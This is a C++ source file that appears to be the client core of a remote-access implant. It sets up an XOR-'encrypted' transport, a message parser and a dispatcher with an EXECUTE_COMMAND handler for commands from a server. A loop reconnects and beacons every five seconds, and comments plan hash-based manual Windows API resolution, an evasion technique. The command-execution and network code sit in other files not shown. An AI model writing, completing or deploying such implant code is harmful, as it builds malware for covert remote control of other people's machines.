#include "ClientSubsystem.h"
#include "ComponentFactory.h"

#include <iostream>


/*
ClientSubsystem::ClientSubsystem()
{
	// loadConfig?
	// enable debugging messages (depending on config?)
	setupSubcomponents();
	setupMessaging();
	// setupEvents();
	// setupTasks();
}
*/

ClientSubsystem::ClientSubsystem(
		Config& config) : config_(config)
{
	// do config? 
	// enable debugging messages (depending on config?)
	setupSubcomponents();
	setupMessaging();
	setupEvents();
	// setupTasks();
}

ClientSubsystem::~ClientSubsystem()
{
	if (serializer_)
	{
		delete serializer_;
	}
	if (encoder_)
	{
		delete encoder_;
	}
	if (encryptor_)
	{
		delete encryptor_;
	}
	if (transportLayer_)
	{
		delete transportLayer_;
		//transportLayer_ = 0;
	}
	if (messageParser_)
	{
		delete messageParser_;
		//messageParser_ = 0;
	}
	if (dispatcher_)
	{
		delete dispatcher_;
	}
	if (controller_)
	{
		delete controller_;
	}

}

void ClientSubsystem::setupMessaging()
{

	//transportLayer_ = TransportLayerFactory::create(TransportLayerType::TCP);
	transportLayer_ = TransportLayerFactory::create(config_.transportLayerType_, encryptor_);
	// TODO: check that serializer and encoder are not null first?
	messageParser_ = new MessageParser(transportLayer_, serializer_, encoder_);

	dispatcher_ = new Dispatcher();
	controller_ = new Controller();
}


void ClientSubsystem::setupSubcomponents()
{
	
	serializer_ = ComponentFactory::create(config_.serializerType_);
	encoder_ = ComponentFactory::create(config_.encoderType_);
	encryptor_ = ComponentFactory::create(config_.encryptorType_);

	/*
	serializer_ = new BinarySerializer();
	encoder_ = new Base64Encoder();
	encryptor_ = new XorEncryptor();
	*/
}

// rename to setupCallbacks ? 
void ClientSubsystem::setupEvents()
{
	// transportLayer_ calls back to MessageParser
	transportLayer_->setOnMessage([&](const RawByteBuffer& msg)
	{
			std::cout << "transportLayer_->setOnMessage" << std::endl;
			messageParser_->handle(msg);
	});

	// messageParser_ calls back to Dispatcher
	messageParser_->setOnMessage([&](const InternalMessage& msg)
	{
			std::cout << "dispatch_->setOnMessage" << std::endl;
			dispatcher_->dispatch(msg);
	});


	//////////////////////////////////////
	// TODO: controller should have a enum block? 
	// that way we can use one overloaded handle function


	dispatcher_->registerHandler(MessageType::DEFAULT, [&](const InternalMessage& msg)
	{
		std::cout << "dispatch_->registerHandler" << std::endl;
		controller_->handleDefault(msg);
	});

	dispatcher_->registerHandler(MessageType::NONE, [&](const InternalMessage& msg)
	{
		std::cout << "dispatch_->registerHandler" << std::endl;
		controller_->handleNone(msg);
	});

	// dispatcher_ executes function associated with MessageType::EXECUTE_COMMAND
	dispatcher_->registerHandler(MessageType::EXECUTE_COMMAND, [&](const InternalMessage& msg)
	{
		std::cout << "dispatch_->registerHandler" << std::endl;
		controller_->handleExecuteCommand(msg);
	});
}

void ClientSubsystem::setupTasks()
{

}


void ClientSubsystem::run() // TODO: rename to start??
{	

	// 1. manually resolve apis
	/*
	TODO:
	would i be more effient to find the function/procedure names all at once for a single dll/module so i don't have
	to loop through the array of functions every single time?

	something like this:
	resolve_all_functions(dll_base, hashes, pointers, count);

	not sure if this is worth doing for dlls/modules tho

	*/
	//std::cout << "ClientSubsystem::run()" << std::endl;

	// transportLayer_->connect();
	// std::thread t([this] { transportLayer_->run(); });
	// t.detach();

	/*
	while (true)
	{
		if (!transportLayer_->isConnected())
		{
			transportLayer_->connect();
		}

		if (transportLayer_->isConnected())
		{
			transportLayer_->beacon();
		}
		Sleep(5000);
	}*/

	std::cout << "ClientSubsystem::run()" << std::endl;

	while (true)
	{
		if (!transportLayer_->isConnected())
		{
			transportLayer_->connect();
		}

		if (transportLayer_->isConnected())
		{
			transportLayer_->run();
			//transportLayer_->update(); // this just receives messages from server
			// TODO:
			// transportLayer_->receive(); ?
			// transportLayer_->beacon();
		}
		Sleep(5000);
	}
}
